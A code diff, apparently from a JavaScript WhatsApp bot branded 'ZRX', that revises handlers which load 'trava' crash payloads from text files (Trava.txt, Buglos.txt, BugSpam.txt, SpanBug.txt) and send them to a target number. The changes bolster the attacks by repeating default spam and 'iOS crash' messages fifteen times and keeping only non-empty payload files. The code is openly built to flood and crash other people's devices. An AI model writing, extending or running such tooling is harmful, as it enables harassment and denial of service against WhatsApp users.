@@ -32,14 +32,13 @@ function consultarAPI(url) {
             });
         });
 
-        req.on('error', (err) => {
+        req.on('error', () => {
             resolve({ erro: "Falha na conexão com o servidor externo." });
         });
 
-        // Timeout de 8 segundos para evitar travamento infinito
         req.setTimeout(8000, () => {
             req.destroy();
-            resolve({ erro: "Tempo limite esgotado (Timeout). O servidor demorou muito para responder." });
+            resolve({ erro: "Tempo limite esgotado (Timeout)." });
         });
     });
 }
@@ -261,7 +260,8 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 let conteudoTrava = "⚡ [ZRX-SPAM] Alvo sob ataque!";
                 const caminhoPayload = path.join(__dirname, 'Trava.txt');
                 if (fs.existsSync(caminhoPayload)) {
-                    conteudoTrava = fs.readFileSync(caminhoPayload, 'utf-8');
+                    const lido = fs.readFileSync(caminhoPayload, 'utf-8').trim();
+                    if (lido.length > 0) conteudoTrava = lido;
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
@@ -342,10 +342,11 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     return;
                 }
 
-                let conteudoBugIos = "🍎 [ZRX-BUG IOS CRASH] 💥 Payload ativado para travamento de dispositivos Apple.";
-                const caminhoBugIos = path.join(__dirname, 'Buglos.txt'); // compatível com o nome criado no github
+                let conteudoBugIos = "🍎 [ZRX-BUG IOS CRASH] 💥 Payload ativado para travamento de dispositivos Apple.\n".repeat(15);
+                const caminhoBugIos = path.join(__dirname, 'Buglos.txt');
                 if (fs.existsSync(caminhoBugIos)) {
-                    conteudoBugIos = fs.readFileSync(caminhoBugIos, 'utf-8');
+                    const lido = fs.readFileSync(caminhoBugIos, 'utf-8').trim();
+                    if (lido.length > 0) conteudoBugIos = lido;
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
@@ -371,10 +372,11 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     return;
                 }
 
-                let conteudoBugSpam = "⚡ [ZRX-BUGSP4M] 💥 Ataque de spam pesado em andamento!";
+                let conteudoBugSpam = "⚡ [ZRX-BUGSP4M] 💥 Ataque de spam pesado em andamento!\n".repeat(15);
                 const caminhoBugSpam = path.join(__dirname, 'BugSpam.txt');
                 if (fs.existsSync(caminhoBugSpam)) {
-                    conteudoBugSpam = fs.readFileSync(caminhoBugSpam, 'utf-8');
+                    const lido = fs.readFileSync(caminhoBugSpam, 'utf-8').trim();
+                    if (lido.length > 0) conteudoBugSpam = lido;
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
@@ -400,10 +402,11 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     return;
                 }
 
-                let conteudoSpanBug = "🌀 [ZRX-SPANBUG] 💀 Loop infinito de caracteres e travamento!";
+                let conteudoSpanBug = "🌀 [ZRX-SPANBUG] 💀 Loop infinito de caracteres e travamento!\n".repeat(15);
                 const caminhoSpanBug = path.join(__dirname, 'SpanBug.txt');
                 if (fs.existsSync(caminhoSpanBug)) {
-                    conteudoSpanBug = fs.readFileSync(caminhoSpanBug, 'utf-8');
+                    const lido = fs.readFileSync(caminhoSpanBug, 'utf-8').trim();
+                    if (lido.length > 0) conteudoSpanBug = lido;
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
